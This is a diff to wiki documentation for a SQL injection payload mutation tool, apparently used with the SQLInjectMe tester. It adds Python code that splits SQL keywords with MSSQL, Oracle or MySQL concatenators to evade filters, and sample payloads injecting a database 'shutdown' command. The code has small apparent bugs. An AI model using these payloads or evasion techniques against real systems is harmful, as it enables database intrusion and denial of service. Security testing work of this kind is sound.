@@ -380,4 +380,119 @@ Input payload file content: ' shutdown --
 
 Output payload file content:xml tags' shutdown -- xml tags
 
+*Note*: The tmntv1.4 tool will take as an input a single file. The SQLInjectMeFormater will load the input file and spit out an xml file that you can use with SQLInjectMe.
+
+
+This function mutates the payload by adding concatenation and case variation:
+----
+{{{
+
+#----------------------------------------------------------------------------------------
+
+def searchPayloadLineUpperAndLower(_keywordList, _payloadLine):
+    # Search payload line for all SQL keywords contained in file CharContainer
+    for _keyword in _keywordList:
+
+        if re.search(_keyword.upper(),_payloadLine):
+
+            return True
+
+        if re.search(_keyword.lower(),_payloadLine):
+
+            return True
+
+    else:
+
+        return False 
+
+#----------------------------------------------------------------------------------------
+ 
+def addConcatenationToKeyword(_option,_sqlKeyword): # Add concatenation to a single SQL kerword
+
+ isConcatMSSQL = re.compile("concatMSSQL")
+ isConcatOracle = re.compile("concatOracle")
+ isConcatMySQL = re.compile("concatMYSQL")
+    
+ _sqlKeywordAsList = list(_sqlKeyword)
+
+ if isConcatMSSQL.match(_option):# Add the concatenator between the second and third character
+    
+    _sqlKeywordAsList.insert(1,"\'+\'")
+
+ if isConcatOracle.match(_option):
+    
+    _sqlKeywordAsList.insert(1,"\'| |\'")
+
+ if isConcatMySQL.match(_option):
+    
+    _sqlKeywordAsList.insert(1,"\' \'")
+
+ _sqlKeyword = ''.join(_sqlKeywordAsList)
+
+ return str(_sqlKeyword).rstrip()
+ 
+#----------------------------------------------------------------------------------------
+
+def concatenationAdder(_option,_payloadList): # Adding concatenators
+ 
+ checkDirectoryExitstance() 
+
+ currentTime = getTime()+'_'
+
+ _mutatePayloadFile = currentTime+"concatenatedPayloads.lst"
+
+ _mutatePayloadFileObj = open(_mutatePayloadFile,"a")
+ 
+ _sqlKeywordElementsFile = sqlKeywordFile
+
+ _sqlKeywordElementsFileObj = open(_sqlKeywordElementsFile,"r")
+
+ _sqlKeywordList = _sqlKeywordElementsFileObj.readlines()
+ 
+ _sqlKeyWordDictionary = {} # Holding SQL keywords mapping 
+
+ _searchList = [] # Holding only SQL keywords for later searching
+ 
+ # Populate dictionary with SQL keywords and equvalent SQL keyword values
+ for _sqlKeyword in _sqlKeywordList:
+
+    _sqlKeyWordDictionary[str(_sqlKeyword).rstrip()] = addConcatenationToKeyword(option,_sqlKeyword)
+
+ # Populate list with SQL keywords for searching later on
+ for _sqlKeywordKey, _sqlKeywordValue in _sqlKeyWordDictionary.iteritems():
+
+    _searchList.append(_sqlKeywordKey)
+
+ for _payloadLine in  _payloadList:
+
+    for _sqlKeywordKey, _sqlKeywordValue  in _sqlKeyWordDictionary.iteritems():
+
+        if re.search(_sqlKeywordKey.upper(),_payloadLine):
+
+            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.upper(),_sqlKeywordValue)
+
+            # Search for all keywords within the payload line
+            if not searchPayloadLineUpperAndLower(_searchList,_payloadLine):
+
+                _mutatePayloadFileObj.write(_payloadLine)
+            
+        if re.search(_sqlKeywordKey.lower(),_payloadLine):
+
+            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.lower(),_sqlKeywordValue)
+
+            # Search for all keywords within the payload line
+            if not searchPayloadLineUpperAndLower(_searchList,_payloadLine):
+
+                _mutatePayloadFileObj.write(_payloadLine)
+
+ _mutatePayloadFileObj.close()
+
+}}}
+----
+  * Example of concatenation :
+
+Input payload file content: ' shutdown -- 
+
+Output payload file content:' sh'+'utdown --
+
 *Note*: The tmntv1.4 tool will take as an input a single file. The SQLInjectMeFormater will load the input file and spit out an xml file that you can use with SQLInjectMe.      
